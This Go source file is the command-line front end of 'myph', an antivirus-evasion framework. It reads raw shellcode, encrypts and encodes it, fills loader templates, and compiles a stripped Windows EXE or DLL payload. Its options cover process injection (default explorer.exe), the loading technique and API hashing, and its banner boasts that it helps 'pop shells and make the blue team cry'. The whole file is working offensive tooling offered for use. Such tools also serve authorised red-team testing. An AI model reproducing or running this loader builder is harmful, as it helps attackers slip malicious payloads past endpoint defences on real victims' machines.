package cli

import (
	"fmt"
	"github.com/cmepw/myph/tools"
	"github.com/spf13/cobra"
	"os"
)

const SoftwareVersion = "2.0.0"
const AsciiArt = `
              ...                                       -==[ M Y P H ]==-
             ;::::;
           ;::::; :;                                   In loving memory of
         ;:::::'   :;                              Wassyl Iaroslavovytch Slipak
        ;:::::;     ;.
       ,:::::'       ;           OOO                      (1974 - 2016)
       ::::::;       ;          OOOOO
       ;:::::;       ;         OOOOOOOO
      ,;::::::;     ;'         / OOOOOOO          
    ;::::::::: . ,,,;.        /  / DOOOOOO
  .';:::::::::::::::::;,     /  /     DOOOO
 ,::::::;::::::;;;;::::;,   /  /        DOOO          AV evasion framework
; :::::: '::::::;;;::::: ,#/  /          DOOO           to pop shells and
: ::::::: ;::::::;;::: ;::#  /            DOOO        make the blue team cry
:: ::::::: ;:::::::: ;::::# /              DOO
 : ::::::: ;:::::: ;::::::#/               DOO
 ::: ::::::: ;; ;:::::::::##                OO       written with <3 by djnn
 :::: ::::::: ;::::::::;:::#                OO                ------
 ::::: ::::::::::::;' :;::#                O             https://djnn.sh
   ::::: ::::::::;  /  /  :#
   :::::: :::::;   /  /    #


    `

func GetParser(opts *Options) *cobra.Command {

	var runLoader = &cobra.Command{
		Use:                "myph",
		Version:            SoftwareVersion,
		DisableSuggestions: true,
		Short:              "AV evasion framework",
		Long:               AsciiArt,
		Run: func(cmd *cobra.Command, args []string) {

			fmt.Println("[+] Reading shellcode")
			shellcode, err := tools.ReadFile(opts.InFile)
			exitIfError(err)

			fmt.Println("[+] Loading temp directory and compilation profile")
			tempDir := GetTempDirPath()
			err = CreateTmpProjectRoot(tempDir)
			exitIfError(err)

			/* fetch the important dependencies to add in build environment */
			GetDependencies(opts, tempDir)

			encryptionKey := tools.RandomString(32)
			fmt.Printf("[+] Encrypting shellcode (algo: %s -- key: %s)\n", opts.CompileConfig.ShellcodeEncryptionMethod.String(), encryptionKey)
			encrypted, err := opts.CompileConfig.ShellcodeEncryptionMethod.Encrypt(shellcode, []byte(encryptionKey), tempDir)
			exitIfError(err)

			fmt.Println("[+] Setting up loader templates")
			encodingType := tools.SelectRandomEncodingType()

			/* shellcode has to be readable for the compiler to understand it */
			encodedKey := tools.EncodeForInterpolation(encodingType, []byte(encryptionKey))
			encodedEncrypted := tools.EncodeForInterpolation(encodingType, encrypted)

			mainTemplate := opts.CompileConfig.GetMainTemplate(encodingType, encodedKey, encodedEncrypted)
			encryptTemplate := opts.CompileConfig.ShellcodeEncryptionMethod.GetTemplate()
			execTemplate, err := opts.CompileConfig.GetExecutionTemplate()
			exitIfError(err)

			fmt.Println("[+] Writing to temp directory")

			errMain := tools.WriteToFile(tempDir, "main.go", mainTemplate)
			errExec := tools.WriteToFile(tempDir, "exec.go", execTemplate)
			errEncrypt := tools.WriteToFile(tempDir, "encrypt.go", encryptTemplate)
			exitIfError(errMain)
			exitIfError(errExec)
			exitIfError(errEncrypt)

			fmt.Println("[+] Compiling shellcode")

			command := opts.CompileConfig.GetCompileCommand(opts.WithDebug)
			command.Dir = tempDir

			_, stderr := command.Output()
			if stderr != nil {

				commandStr := "go build -ldflags \"-s -w -H=windowsgui\" -o payload.exe"
				if opts.CompileConfig.ArtefactType == PE_DLL {
					commandStr = "CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -ldflags \"-s -w -H=windowsgui\" -o payload.dll"
				}

				fmt.Printf("[!] error compiling shellcode: %s\n", stderr.Error())
				fmt.Printf(
					"\nYou may try to run the following command in %s to find out what happend:\n\n GOOS=%s GOARCH=%s %s\n\n",
					tempDir,
					opts.CompileConfig.OSTarget,
					opts.CompileConfig.ArchTarget,
					commandStr,
				)

				fmt.Println("If you want to submit a bug report, please add the output from this command...Thank you <3")
				os.Exit(1)
			}

			fmt.Println("[+] Cleaning up build environment")
			err = os.RemoveAll(tempDir)
			exitIfError(err)

		},
	}

	defaults := DefaultOptions()
	var rootCmd = runLoader

	rootCmd.Flags().StringVarP(&opts.InFile, "shellcode", "s", defaults.InFile, "shellcode filepath (raw format)")
	rootCmd.Flags().StringVarP(&opts.OutFile, "output", "o", defaults.OutFile, "output filename (without extension)")

	rootCmd.Flags().BoolVarP(
		&opts.WithDebug,
		"debug",
		"d",
		false,
		"enable debug mode (more logging and generates debug build)",
	)

	rootCmd.Flags().VarP(
		&opts.CompileConfig.ArchTarget,
		"arch",
		"",
		"output target architecture (allowed: amd64, arm64, i386)",
	)

	rootCmd.Flags().VarP(
		&opts.CompileConfig.OSTarget,
		"os",
		"",
		"output target os ([!] Only Windows is supported for now)",
	)

	rootCmd.Flags().VarP(
		&opts.CompileConfig.ArtefactType,
		"out-type",
		"",
		"artefact output type (exe, dll, ...)",
	)

	rootCmd.Flags().VarP(
		&opts.CompileConfig.ShellcodeEncryptionMethod,
		"encryption-method",
		"e",
		"shellcode encryption method (key is auto-generated)",
	)

	rootCmd.Flags().StringVarP(
		&opts.CompileConfig.ShellcodeLoading.Target,
		"process",
		"p",
		"explorer.exe",
		"process to inject shellcode to ([!] not all methods support this!)",
	)

	rootCmd.Flags().VarP(
		&opts.CompileConfig.ShellcodeLoading.Technique,
		"technique",
		"",
		"shellcode-loading technique",
	)

	rootCmd.Flags().BoolVarP(
		&opts.CompileConfig.APIHashingConfig.IsEnabled,
		"use-api-hashing",
		"",
		false,
		"Use API-hashing for shellcode-loading templates",
	)

	rootCmd.Flags().VarP(
		&opts.CompileConfig.APIHashingConfig.Technique,
		"api-hashing-method",
		"a",
		"not supported for all templates yet",
	)

	rootCmd.Flags().SortFlags = false
	return rootCmd
}
